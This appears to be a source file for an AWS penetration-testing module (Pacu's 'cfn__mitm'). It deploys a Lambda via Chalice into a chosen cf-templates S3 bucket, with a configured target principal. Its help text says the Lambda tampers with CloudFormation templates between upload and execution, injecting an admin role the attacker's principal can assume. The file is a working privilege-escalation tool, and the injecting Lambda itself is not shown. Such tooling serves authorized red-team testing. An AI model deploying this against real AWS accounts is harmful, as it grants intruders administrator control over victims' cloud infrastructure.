#!/usr/bin/env python3
import argparse
import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import TYPE_CHECKING

from botocore.exceptions import ClientError
from chalice import cli

from pacu import Main
from pacu.core.lib import module_data_dir

if TYPE_CHECKING:
    import mypy_boto3_iam
    import mypy_boto3_iam.type_defs
    import mypy_boto3_s3

module_info = {
    'name': 'cfn__mitm',
    'author': 'You of your company',
    'category': 'ESCALATE',
    'one_liner': "Set's up a lambda function to modify CloudFormation templates between execution and upload.",
    'description': 'TODO',
    'services': ['S3'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--principal', help='''
The principal to set in the injected roles trust policy. If the attack succeeds this user/role will be able to assume the
newly created role which has admin privileges. Defaults to the current user used by Pacu.

Example: arn:aws:iam::123456789012:role/example.
'''.strip())

parser.add_argument('--delete', action='store_true', help='Delete an existing deployment.')
parser.add_argument('--lambda-role', help='Role to use for the deployed lambda function.')
parser.add_argument('--bucket', help=' The S3 Bucket name to target, this is usually something like cf-templates-*.')

parser.add_argument('--region', help='''
Region to deploy the lambda to, this does not need to match the region of the S3 bucket.
'''.strip())

def get_bucket_name(s3: 'mypy_boto3_s3.ServiceResource', lambda_dir: 'Path') -> str:
    buckets = [b for b in s3.buckets.all() if b.name.startswith('cf-templates')]

    if not buckets:
        raise UserWarning("No 'cf-templates-*' S3 buckets found.")

    print("Discovered S3 cf-template buckets:")
    for i, bucket in enumerate(buckets):
        if (lambda_dir/bucket.name/'.deployed').exists():
            print(f"{i}) {bucket.name} (deployed)")
        else:
            print(f"{i}) {bucket.name}")


    while True:
        selection = input("Select a S3 Bucket to target: ")
        try:
            return buckets[int(selection)].name
        except (ValueError, IndexError):
            print("Invalid selection")

def get_lambda_role(iam: 'mypy_boto3_iam.ServiceResource'):
    roles = []
    for role in iam.roles.all():
        for stmt in role.assume_role_policy_document['Statement']:
            if stmt['Principal'].get('Service') == 'lambda.amazonaws.com':
                roles.append(role)

    print("Existing lambda roles:")
    return prompt(roles, "Select a role to use for the lambda function: ", lambda o: o.name).arn


def get_region(bucket, valid_regions) -> str:
    try:
        region = '-'.join(bucket.split('-')[-3:])
    except IndexError:
        region = None

    if region not in valid_regions:
        print('Could not determine the region from the bucket.')
        region = prompt(valid_regions, "Enter the region of the selected bucket: ")

    return region


def prompt(options, msg: str, opt_print_func=lambda o: o) -> str:
    for i, opt in enumerate(options):
        print(f"{i}) {opt_print_func(opt)}")

    while True:
        selection = input(msg)
        try:
            return options[int(selection)]
        except (ValueError, IndexError):
            print("Invalid selection")


# Main is the first function that is called when this module is executed.
def main(args, pacu_main: 'Main'):
    session = pacu_main.get_active_session()

    ###### These can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    key_info = pacu_main.key_info
    ######

    user = key_info()

    env = {
        "AWS_ACCESS_KEY_ID": user['AccessKeyId'],
        "AWS_SECRET_ACCESS_KEY": user['SecretAccessKey'],
        "AWS_SESSION_TOKEN": user['SessionToken'],
        "PATH": os.environ["PATH"],
    }

    lambda_dir = (module_data_dir(pacu_main.running_module_names[-1])/'cfn__mitm_lambda')

    if args.bucket:
        bucket = args.bucket
    else:
        bucket = get_bucket_name(pacu_main.get_boto3_resource('s3'), lambda_dir)

    if args.region:
        env["AWS_DEFAULT_REGION"] = args.region
    else:
        env["AWS_DEFAULT_REGION"] = get_region(bucket, pacu_main.get_regions('lambda'))
        print(f"Will deploy lambda to f{env['AWS_DEFAULT_REGION']}")

    bucket_lambda_dir = (lambda_dir/bucket)
    if args.delete:
        if not bucket_lambda_dir.exists():
            raise UserWarning(f"The directory {str(bucket_lambda_dir)} does not exist.")
        subprocess.check_call(['chalice', '--project-dir', bucket_lambda_dir, 'delete'], env=env)
        shutil.rmtree(bucket_lambda_dir)
        return 'Deletion Succeeded'

    if not bucket_lambda_dir.exists():
        shutil.copytree((Path(__file__).parent/'cfn__mitm_lambda'), bucket_lambda_dir, dirs_exist_ok=True)
    shutil.copytree((Path(__file__).parent/'cfn__mitm_lambda'), bucket_lambda_dir, dirs_exist_ok=True)

    if args.lambda_role:
        lambda_role = args.lambda_role
    else:
        iam = pacu_main.get_boto3_resource('iam')
        lambda_role = get_lambda_role(iam)

    config_path = bucket_lambda_dir/'.chalice'/'config.json'
    config = json.loads(config_path.read_text())
    config['stages']['dev']['iam_role_arn'] = lambda_role
    config['stages']['dev']['environment_variables']['PRINCIPAL'] = args.principal or user['Arn']
    config['stages']['dev']['environment_variables']['BUCKET'] = bucket
    config_path.write_text(json.dumps(config))

    subprocess.check_call(['chalice', '--project-dir', str(bucket_lambda_dir), 'deploy'], env=env)
    (bucket_lambda_dir/'.deployed').touch(exist_ok=True)
    return 'Lambda creation succeeded'


def summary(data, pacu_main):
    return data
